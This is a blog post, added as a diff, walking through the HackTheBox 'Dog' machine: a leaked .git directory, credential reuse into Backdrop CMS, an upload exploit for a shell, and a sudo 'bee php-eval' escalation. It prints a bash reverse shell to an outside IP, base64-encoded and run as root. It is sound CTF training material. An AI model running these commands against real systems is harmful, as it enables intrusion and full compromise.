@@ -1,0 +1,239 @@
+---
+layout: post
+title: Dog
+date: 2025-06-22 00:34:00 +0800
+categories: [HackTheBox, Easy]
+tags: [git-exposed, php-rce, backdrop-cms, sudo-abuse, custom-binary, reverse-shell]
+author: klein
+image:
+  path: /images/images-dog/image_26.png
+  
+---
+
+### Quick summary:
+
+This is an Easy level Linux machine. The box has port 80(http) and port 22(ssh) open. There is going to be a .git directory which is going to contain leaked credentials. These credentials are going to be a way into the application. With a quick Google search, we can find an exploit to upload a shell.zip file. This way we will get a shell as the www-data user and after that, we can reuse the found credentials the second time to switch to another user. To finish it off the sudo -l command is going to show that we can run an application that executes php as root.
+
+
+As always let's start with enumeration:
+```bash
+nmap -sC -sV -vv -oN dog 10.129.204.111
+```
+
+
+![b](/images/images-dog/image_01.png)
+
+
+
+After this, I tried directory busting and searching for virtual hosts. Before going straight to the web page and the .git directory.
+
+```
+gobuster dir -u http://dog.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt  
+```
+
+
+![b](/images/images-dog/image_02.png)
+
+
+Nothing came back that would have led me further.
+
+Let's go to the website.
+
+
+![b](/images/images-dog/image_03.png)
+
+As you would have guessed, this website is all about dogs.
+There is a login portal with a reset password functionality. User enumeration through error messages is possible, but this is not going to get me further for now.
+
+Let's download the git directory with git-dumper.
+```
+ git-dumper http://dog.htb/.git git/ 
+```
+When going over a .git directory I always look for the latest changes, any files that have not been committed yet, or just for the line that were modified. In this case, this did not lead me further.
+
+**I found nothing by doing these.
+
+I did a manual exploration and found database credentials:
+
+
+![b](/images/images-dog/image_04.png)
+
+
+Password reuse is very common, and this is going to come in handy.
+
+Outside of this information, there was an email on the About page:
+```
+support@dog.htb
+```
+
+It is also important to add the domain name to the host file.
+```bash
+sudo vi /etc/hosts
+```
+
+![b](/images/images-dog/image_05.png)
+
+
+**Also it is an important detail that the site is using Backdrop CMS.
+
+I got to the idea to search for this domain in the source code, I was not finding any secrets, but I had a password which led me to the conclusion that I need users.
+
+I did that with the following very simple command.
+```bash
+grep -r -i "@dog.htb" .
+```
+
+This gave me a new username:
+```
+tiffany@dog.htb
+```
+
+
+![b](/images/images-dog/image_06.png)
+
+
+
+Using this username with the database password that was found earlier I can log into the CMS.
+
+This will disclose a lot of new information, for example, a bunch of new usernames:
+
+
+![b](/images/images-dog/image_07.png)
+
+
+```
+rosa
+axel
+morris
+john
+dogBackDropSystem
+jobert
+jPAdminB
+```
+
+Also, the version number is going to be disclosed as well in the CMS.
+
+
+![b](/images/images-dog/image_08.png)
+
+
+Time to do a simple Google search:
+```
+backdrop cms 1.27.1 exploit
+```
+
+
+![b](/images/images-dog/image_09.png)
+
+
+Let's take a look at the first one, download it, and then inspect how it works.
+
+![b](/images/images-dog/image_10.png)
+
+
+It is also going to help with finding the uploaded file and where to upload it.
+
+![b](/images/images-dog/image_11.png)
+
+
+Go to Appearance > Install themes > Manual installation.
+
+Unfortunately, it is not going to allow you to upload a .zip file. It also lists, that for example .tar is accepted. 
+
+
+![b](/images/images-dog/image_12.png)
+
+
+I strongly believe there is more than one way to bypass this filter, at the time of writing this post the easiest way seemed to modify the Python script.
+
+Let's modify the function that creates the now .tar file and then the main() function.
+
+
+![b](/images/images-dog/image_13.png)
+
+
+This way the file can be uploaded, and be found in the directory that is also listed in the exploit script output.
+
+
+![b](/images/images-dog/image_14.png)
+
+
+![b](/images/images-dog/image_15.png)
+
+
+However, there is a script on the box that is going to delete the file after a minute or so, so you will have to act quickly.
+
+With the help of the awesome website https://www.revshells.com/, I quickly copied a bash reverse shell and started a Netcat listener.
+
+There was one more thing, for some reason the only way I could upload a file was to copy it to a .html file and execute it right away with curl after uploading it. 
+
+
+![b](/images/images-dog/image_16.png)
+
+
+![b](/images/images-dog/image_17.png)
+
+
+![b](/images/images-dog/image_18.png)
+
+
+![b](/images/images-dog/image_19.png)
+
+
+This works because by default when you request a URL with no file specified, curl fetched:
+```bash
+http://<your_ip>:<server_port>/ 
+```
+
+This maps to /, which the Python HTTP server serves as index.html by default. And with bash, it gets executed right away.
+
+Let's stabilize the shell.
+
+
+![b](/images/images-dog/image_20.png)
+
+
+By exploring the server, there are 2 users.
+
+
+![b](/images/images-dog/image_21.png)
+
+
+Because there were not many options for the www-data user, I tried to switch to one of the users with the already-found credentials. Which worked :). 
+
+
+![b](/images/images-dog/image_22.png)
+
+
+After trying out cron jobs, and SUID binaries, the way of escalating privileges is going to be the bee file that can be run with sudo privileges.
+
+
+![b](/images/images-dog/image_23.png)
+
+
+By running this program in itself, there are multiple interesting features, however, the most interesting part is that it can run php-eval as root.
+
+I also base64 encoded my payload to avoid quoting issues.
+
+My payload:
+
+```bash
+REV=$(echo 'bash -i >& /dev/tcp/10.10.14.74/9002 0>&1' | base64)
+```
+
+Let's start a listener and execute it.
+
+```bash
+sudo bee --root=/var/www/html php-eval 'system("echo '$REV' | base64 -d | bash");'
+```
+
+```
+--root=/var/www/html
+```
+This part is important because it specifies the root directory of the Backdrop installation. It is a requirement to the tool this way.
+
+
+![b](/images/images-dog/image_24.png)
+
+
+![b](/images/images-dog/image_25.png)
